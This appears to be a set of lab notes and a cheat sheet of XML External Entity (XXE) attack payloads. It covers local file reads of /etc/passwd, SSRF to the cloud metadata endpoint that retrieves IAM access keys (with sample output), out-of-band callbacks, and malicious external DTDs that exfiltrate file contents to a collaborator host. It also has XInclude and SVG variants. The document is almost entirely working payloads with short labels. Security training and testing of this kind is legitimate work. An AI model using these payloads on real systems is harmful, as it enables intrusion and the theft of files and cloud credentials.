-  XXE -> Basic LFI
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE productId [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<stockCheck><productId>&test;</productId><storeId>1</storeId></stockCheck>
```
- XXE -> SSRF
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://169.254.169.254/'>]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
- XXE -> Out of Band Interaction
```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://rgbxdmmdxsj6xufq1help1jaa1gs4is7.oastify.com'>]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
- XXE -> Out of Band Interaction via parameter entity
```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://i6po3dc4nj9xnl5hr84cfs910s6juaiz.oastify.com"> %xxe; ]>
```
- XXE -> Exfiltrate data with .dtd
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://7jrdg2pt08mm0ai64xh1shmqdhj97zvo.oastify.com?x=%file;'>">
%eval;
%error;
```
- XXE -> Exfiltrate data via error messages
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
- XXE -> Use XInclude in a parameter (url encode the payload)
```html
?productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

or

<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="{filePath}" parse="text"/>
```
- XXE -> XXE on svg
```html
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
#### XXE to perform SSRF
```xml
The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://169.254.169.254/'>]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin'>]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

Gives = "Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2024-01-04T10:03:06.016826989Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ZgBxuLo1qUbadDsb5agi",
  "SecretAccessKey" : "62J0cLHKUttLOoKaXvTc55LgWDRLEuv7S6jfIQSc",
  "Token" : "tyIjMrJIsrPDFGSmR9u4hqFqjzxIx7yO9h8dshFOBPTNkBpvCY0jou4GcFhxBkzetcXYr8oWTS1uWYhyyxiStHap8tv6q83xWT8dHus70bXuuZjeD6w0jTzuQy1vakLar6k2apXbrrhj3fpZVNM7XKwPVTFPg2degLdeMSPCXRWgsD5D2Uoyjd9LkFMwLsdk2hFpIGW89uvX1xY4EKTNzipFL3irC3C2Jr49uCCtvDCGCEa6iwLeySLjttI5LUS7",
  "Expiration" : "2030-01-02T10:03:06.016826989Z"
}"


<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///Windows/System32/drivers/etc/hosts" > ]>

```

##### Blind XXE with out-of-band interaction
```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://rgbxdmmdxsj6xufq1help1jaa1gs4is7.oastify.com'>]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

##### Blind XXE with out-of-band-interaction via XML parameter entities
Get a DNS response
```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://i6po3dc4nj9xnl5hr84cfs910s6juaiz.oastify.com"> %xxe; ]>
```

##### Exploiting blind XXE to exfiltrate data using a malicious external DTD
Save DTD file on your side "ext.dtd"
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://7jrdg2pt08mm0ai64xh1shmqdhj97zvo.oastify.com?x=%file;'>">
%eval;
%error;
```

Send XML payload
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://yoursite/ext.dtd"> %xxe;]>
```


##### Exploiting blind XXE to retrieve data via error messages
When we try the payload from the previous exercise, we get an error, then we try to abuse that error to display file contents:
```"XML parser exited with error: java.net.MalformedURLException: Illegal character in URL"```
save DTD
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
Send payload
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://yoursite/ext.dtd"> %xxe;]>
```
The error will contain the name of the file, and the name of the file is the content of etc/passwd

##### Abusing XInclude
```html
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

```html
productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
```
##### XXE on svg image
```html
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

##### xmlns load etc/passwd
```
<rpo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></rpo>
```
